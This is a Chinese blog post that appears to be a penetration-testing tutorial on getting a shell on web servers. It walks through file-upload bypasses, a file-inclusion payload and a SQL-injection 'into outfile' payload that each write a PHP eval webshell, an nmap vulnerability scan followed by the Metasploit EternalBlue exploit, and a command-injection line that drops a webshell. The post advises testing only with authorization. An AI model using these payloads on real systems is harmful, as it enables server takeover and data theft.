<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>getshell思路 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="getshell思路" />
<meta property="og:description" content="getshell能干嘛文件上传getshell文件包含getshellsql注入getshell操作系统漏洞getshellRCE getshell总结 授人以鱼，不如授人以渔
getshell能干嘛 1.执行终端命令
2.文件管理（增删改查）
3.数据库管理（增删改查，前提找到root用户密码）
文件上传getshell 网站有上传点，最容易getshell。
直接上传一个一句话木马，然后使用webshell管理工具，就能成功getshell
如果web应用对上传的文件进行过滤，要想办法绕过，如前端js绕过，MIME验证绕过，黑名单绕过，大小写绕过,双写绕过,00截断,利用web容器的解析漏洞绕过等等，这里就不一一列举了
文件包含getshell 利用文件包含漏洞，输入php://input伪协议，进行写入一句话木马
&lt;?php fputs(fopen(&#39;muma1.php&#39;,&#39;w&#39;),&#39;&lt;?php echo &#34;I am a horse&#34;;@eval($_REQUEST[&#34;pass&#34;]);?&gt;&#39;);?&gt; 因为文件包含会解析php
所以当执行了这个脚本，会在目标服务器创建一个muma1.php的一句话木马
直接连接我们创建的木马，即可getshell
sql注入getshell 前提
1.secure_file_priv为空
2.当前数据库用户具有文件读写权限
3.魔术引号关闭
4.知道网站根目录路径
@@basedir 知道它的数据库根目录，去推测其web根目录
然后将木马导出到web根目录中
-1&#39; union select 1,2,&#34;&lt;?php eval($_REQUEST[&#39;pass&#39;]);?&gt;&#34; into outfile &#34;C:/phpstudy_pro/WWW/muma2.php&#34;%23 使用webshell管理工具连接
操作系统漏洞getshell 利用操作系统内核溢出漏洞getshell
服务器ip（攻击者可以使用ping 域名获取，有CDN先绕过）
然后攻击者使用nmap NSE查看服务器的存在的漏洞
sudo nmap --script vuln -T 4 192.168.208.131 这里找到了两个漏洞，这里最有价值的是ms17-010（永恒之蓝）这个漏洞，因为可以RCE
接着就可以使用metasploit里的exp进行getshell了
这里的meterpreter就是一个shell，而且功能还十分强大，有兴趣可以自行了解
RCE getshell 当我们提交的数据被服务器当作终端命令执行的时候，其实已经getshell了，因为我们可以可以输入各种各样的终端命令，达到文件管理，用户管理等目的。
但这里还是演示下，当web应用有个RCE的其中一个利用方法
12 &amp; echo &#34;&lt;?php echo &#34;I am a horse&#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/4bde6c72be0976df62c9868f601c3ebd/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-02-27T15:36:34+08:00" />
<meta property="article:modified_time" content="2022-02-27T15:36:34+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">getshell思路</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4> </h4> 
 <ul><li><a href="#getshell_5" rel="nofollow">getshell能干嘛</a></li><li><a href="#getshell_15" rel="nofollow">文件上传getshell</a></li><li><a href="#getshell_23" rel="nofollow">文件包含getshell</a></li><li><a href="#sqlgetshell_36" rel="nofollow">sql注入getshell</a></li><li><a href="#getshell_54" rel="nofollow">操作系统漏洞getshell</a></li><li><a href="#RCE_getshell_73" rel="nofollow">RCE getshell</a></li><li><a href="#_86" rel="nofollow">总结</a></li></ul> 
</div> 
<p></p> 
<hr> 
<blockquote> 
 <p>授人以鱼，不如授人以渔</p> 
</blockquote> 
<h2><a id="getshell_5"></a>getshell能干嘛</h2> 
<p>1.执行终端命令<br> 2.文件管理（增删改查）<br> 3.数据库管理（增删改查，前提找到root用户密码）<br> <img src="https://images2.imgbox.com/4c/02/M0DGReti_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/cc/27/ioNBqLcM_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="getshell_15"></a>文件上传getshell</h2> 
<p>网站有上传点，最容易getshell。<br> <img src="https://images2.imgbox.com/65/1d/byfJVe0w_o.png" alt="在这里插入图片描述"><br> 直接上传一个一句话木马，然后使用webshell管理工具，就能成功getshell<br> <img src="https://images2.imgbox.com/41/a7/V6JfcwBy_o.png" alt="在这里插入图片描述"><br> 如果web应用对上传的文件进行过滤，要想办法绕过，如<code>前端js绕过</code>，<code>MIME验证绕过</code>，<code>黑名单绕过</code>，<code>大小写绕过</code>,<code>双写绕过</code>,<code>00截断</code>,<code>利用web容器的解析漏洞绕过</code>等等，这里就不一一列举了</p> 
<h2><a id="getshell_23"></a>文件包含getshell</h2> 
<p>利用文件包含漏洞，输入php://input伪协议，进行写入一句话木马</p> 
<pre><code class="prism language-bash"><span class="token operator">&lt;</span>?php fputs<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token string">'muma1.php'</span>,<span class="token string">'w'</span><span class="token punctuation">)</span>,<span class="token string">'&lt;?php echo "I am a horse";@eval(<span class="token variable">$_REQUEST</span>["pass"]);?&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">&gt;</span>
</code></pre> 
<p>因为文件包含会解析php<br> 所以当执行了这个脚本，会在目标服务器创建一个muma1.php的一句话木马<br> <img src="https://images2.imgbox.com/ac/b2/li1LAM4y_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/27/84/5PrampWR_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/a5/6f/w9iTpglR_o.png" alt="在这里插入图片描述"><br> 直接连接我们创建的木马，即可getshell<br> <img src="https://images2.imgbox.com/b3/25/WLuq3liB_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="sqlgetshell_36"></a>sql注入getshell</h2> 
<p>前提<br> 1.secure_file_priv为空<br> 2.当前数据库用户具有文件读写权限<br> 3.魔术引号关闭<br> 4.知道网站根目录路径</p> 
<p>@@basedir 知道它的数据库根目录，去推测其web根目录<br> <img src="https://images2.imgbox.com/8c/9c/BII4N3mt_o.png" alt="在这里插入图片描述"><br> 然后将木马导出到web根目录中</p> 
<pre><code class="prism language-bash">-1<span class="token string">' union select 1,2,"&lt;?php eval(<span class="token variable">$_REQUEST</span>['</span>pass'<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">&gt;</span><span class="token string">" into outfile "</span>C:/phpstudy_pro/WWW/muma2.php"%23
</code></pre> 
<p><img src="https://images2.imgbox.com/4c/3b/eXPxErkL_o.png" alt="在这里插入图片描述"><br> 使用webshell管理工具连接<br> <img src="https://images2.imgbox.com/0c/e3/fKHVpUuB_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/8e/d0/YUCWVJ1Q_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="getshell_54"></a>操作系统漏洞getshell</h2> 
<p>利用操作系统内核溢出漏洞getshell<br> 服务器ip（攻击者可以使用ping 域名获取，有CDN先绕过）<br> <img src="https://images2.imgbox.com/ce/1a/S6i8P6X3_o.png" alt="在这里插入图片描述"><br> 然后攻击者使用nmap NSE查看服务器的存在的漏洞</p> 
<pre><code class="prism language-bash"><span class="token function">sudo</span> nmap --script vuln -T <span class="token number">4</span> <span class="token number">192.168</span>.208.131
</code></pre> 
<p><img src="https://images2.imgbox.com/b7/de/u1cK2H3Y_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/ff/27/U2ZW53w4_o.png" alt="在这里插入图片描述"><br> 这里找到了两个漏洞，这里最有价值的是ms17-010（永恒之蓝）这个漏洞，因为可以RCE<br> 接着就可以使用metasploit里的exp进行getshell了<br> <img src="https://images2.imgbox.com/60/8e/rYDmAHfg_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/07/e9/92LqFfJx_o.png" alt="在这里插入图片描述"><br> 这里的meterpreter就是一个shell，而且功能还十分强大，有兴趣可以自行了解</p> 
<h2><a id="RCE_getshell_73"></a>RCE getshell</h2> 
<p><strong>当我们提交的数据被服务器当作终端命令执行的时候，其实已经getshell了</strong>，因为我们可以可以输入各种各样的终端命令，达到文件管理，用户管理等目的。<br> 但这里还是演示下，当web应用有个RCE的其中一个利用方法</p> 
<pre><code class="prism language-bash"><span class="token number">12</span> <span class="token operator">&amp;</span> <span class="token builtin class-name">echo</span> <span class="token string">"&lt;?php echo "</span>I am a horse<span class="token string">";@eval(<span class="token variable">$_REQUEST</span>["</span>pass<span class="token string">"]);?&gt;"</span> <span class="token operator">&gt;</span> F:<span class="token punctuation">\</span>phpstudy_pro<span class="token punctuation">\</span>WWW<span class="token punctuation">\</span>muma3.php
</code></pre> 
<p>使用cmd命令写入一个一句话木马到web根目录<br> <img src="https://images2.imgbox.com/ae/be/RbA68G8C_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/96/a2/ywPhnJnY_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/7e/3c/w7lLXFsG_o.png" alt="在这里插入图片描述"><br> 还有些cms，web容器，操作系统旧版本有RCE漏洞，直接利用就完事了，像之前很火的Apache log4j2漏洞也有RCE漏洞，总之服务器有RCE漏洞，就差不多相当于是自己的服务器了。</p> 
<h2><a id="_86"></a>总结</h2> 
<p>以上就是我目前了解到的getshell方法，最好是在已授权的情况下测试或者在自己搭建的环境测试，不然可能会被查水表，日志里都记录了你干了啥，所以自己衡量吧。</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/d4da44c811fd35ed04d2b942dfa10dcb/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">六种软件设计原则</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/fbe29baa4e6bbebf33545c499b7d4de0/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">分库分表的小节</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>